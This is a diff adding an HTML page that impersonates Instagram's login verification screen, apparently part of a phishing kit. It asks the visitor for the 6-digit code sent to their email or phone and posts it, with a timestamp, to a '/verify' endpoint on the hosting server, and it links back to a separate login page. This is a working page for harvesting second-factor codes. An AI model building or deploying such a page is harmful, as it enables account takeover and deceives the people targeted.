@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram - Verify Your Account</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background-color: #161f23;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    }
+    .verify-container {
+      width: 100%;
+      max-width: 420px;
+      padding: 0 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* Lock icon */
+    .lock-icon {
+      width: 72px;
+      height: 72px;
+      border: 3px solid #e8e8e8;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 24px;
+    }
+    .lock-icon svg {
+      width: 34px;
+      height: 34px;
+      fill: #e8e8e8;
+    }
+
+    h1 {
+      color: #e8e8e8;
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 12px;
+      text-align: center;
+    }
+    .subtitle {
+      color: #8e8e8e;
+      font-size: 14px;
+      text-align: center;
+      line-height: 1.6;
+      margin-bottom: 28px;
+    }
+    .subtitle span {
+      color: #e8e8e8;
+      font-weight: 500;
+    }
+
+    /* Code input boxes */
+    .code-inputs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 24px;
+      justify-content: center;
+    }
+    .code-inputs input {
+      width: 48px;
+      height: 52px;
+      background-color: #161f23;
+      border: 1px solid #2e3d50;
+      border-radius: 10px;
+      color: #ffffff;
+      font-size: 22px;
+      font-weight: 500;
+      text-align: center;
+      outline: none;
+      font-family: inherit;
+      transition: border-color 0.2s;
+      caret-color: transparent;
+    }
+    .code-inputs input:focus {
+      border-color: #8e8e8e;
+    }
+    .code-inputs input.filled {
+      border-color: #4a5e72;
+    }
+
+    .confirm-btn {
+      width: 100%;
+      background-color: #3457a8;
+      color: #a8b8d0;
+      border: none;
+      border-radius: 50px;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 500;
+      font-family: inherit;
+      cursor: not-allowed;
+      letter-spacing: 0.2px;
+      transition: opacity 0.2s;
+      opacity: 0.4;
+      margin-bottom: 20px;
+    }
+    .confirm-btn.active {
+      opacity: 1;
+      cursor: pointer;
+    }
+    .confirm-btn.active:hover {
+      background-color: #3d62be;
+    }
+
+    .divider {
+      width: 100%;
+      height: 1px;
+      background-color: #2e3d50;
+      margin-bottom: 20px;
+    }
+
+    .resend-link {
+      color: #e8e8e8;
+      font-size: 14px;
+      font-weight: 600;
+      text-decoration: none;
+      display: block;
+      text-align: center;
+      margin-bottom: 16px;
+    }
+    .resend-link:hover {
+      color: #ffffff;
+    }
+
+    .other-method {
+      color: #8e8e8e;
+      font-size: 14px;
+      text-decoration: none;
+      display: block;
+      text-align: center;
+      margin-bottom: 16px;
+    }
+    .other-method:hover {
+      color: #e8e8e8;
+    }
+
+    .back-link {
+      color: #8e8e8e;
+      font-size: 14px;
+      text-decoration: none;
+      display: block;
+      text-align: center;
+    }
+    .back-link:hover {
+      color: #e8e8e8;
+    }
+
+    .message {
+      text-align: center;
+      margin-bottom: 12px;
+      font-size: 14px;
+      color: #5cb85c;
+      display: none;
+    }
+    .message.error { color: #e05555; }
+  </style>
+</head>
+<body>
+  <div class="verify-container">
+
+    <!-- Lock icon -->
+    <div class="lock-icon">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M18 8h-1V6A5 5 0 0 0 7 6v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 
+0-2-2zm-6 9a2 2 0 1 1 0-4 2 2 0 0 1 0 4zm3.1-9H8.9V6a3.1 3.1 0 0 1 6.2 0v2z"/>
+      </svg>
+    </div>
+
+    <h1>Enter confirmation code</h1>
+    <p class="subtitle">
+      To log into <span>Instagram</span>, enter the 6-digit code we sent to your email or phone number.
+    </p>
+
+    <!-- 6 digit code boxes -->
+    <div class="code-inputs">
+      <input type="tel" maxlength="1" class="code-box" />
+      <input type="tel" maxlength="1" class="code-box" />
+      <input type="tel" maxlength="1" class="code-box" />
+      <input type="tel" maxlength="1" class="code-box" />
+      <input type="tel" maxlength="1" class="code-box" />
+      <input type="tel" maxlength="1" class="code-box" />
+    </div>
+
+    <div class="message" id="message"></div>
+
+    <button class="confirm-btn" id="confirmBtn" disabled>Confirm</button>
+
+    <div class="divider"></div>
+
+    <a href="#" class="resend-link">Resend code</a>
+    <a href="#" class="other-method">Get more help</a>
+    <a href="index.html" class="back-link">Back to login</a>
+
+  </div>
+
+  <script>
+    const boxes = document.querySelectorAll('.code-box');
+    const confirmBtn = document.getElementById('confirmBtn');
+    const message = document.getElementById('message');
+
+    boxes.forEach((box, i) => {
+      box.addEventListener('input', (e) => {
+        // Only allow numbers
+        box.value = box.value.replace(/[^0-9]/g, '');
+        if (box.value.length === 1) {
+          box.classList.add('filled');
+          if (i < boxes.length - 1) boxes[i + 1].focus();
+        }
+        checkCode();
+      });
+
+      box.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && box.value === '' && i > 0) {
+          boxes[i - 1].value = '';
+          boxes[i - 1].classList.remove('filled');
+          boxes[i - 1].focus();
+          checkCode();
+        }
+      });
+
+      // Handle paste
+      box.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pasted = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
+        pasted.split('').forEach((char, j) => {
+          if (boxes[j]) {
+            boxes[j].value = char;
+            boxes[j].classList.add('filled');
+          }
+        });
+        const nextEmpty = [...boxes].findIndex(b => b.value === '');
+        if (nextEmpty !== -1) boxes[nextEmpty].focus();
+        else boxes[5].focus();
+        checkCode();
+      });
+    });
+
+    function checkCode() {
+      const full = [...boxes].every(b => b.value.length === 1);
+      confirmBtn.disabled = !full;
+      confirmBtn.classList.toggle('active', full);
+    }
+
+    confirmBtn.addEventListener('click', async () => {
+      if (confirmBtn.disabled) return;
+      const code = [...boxes].map(b => b.value).join('');
+      try {
+        const res = await fetch('/verify', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ code, timestamp: new Date().toISOString() })
+        });
+        const data = await res.json();
+        message.textContent = '✓ Code submitted.';
+        message.className = 'message';
+        message.style.display = 'block';
+      } catch (err) {
+        message.textContent = '✗ Could not connect to server.';
+        message.className = 'message error';
+        message.style.display = 'block';
+      }
+    });
+  </script>
+</body>
+</html>
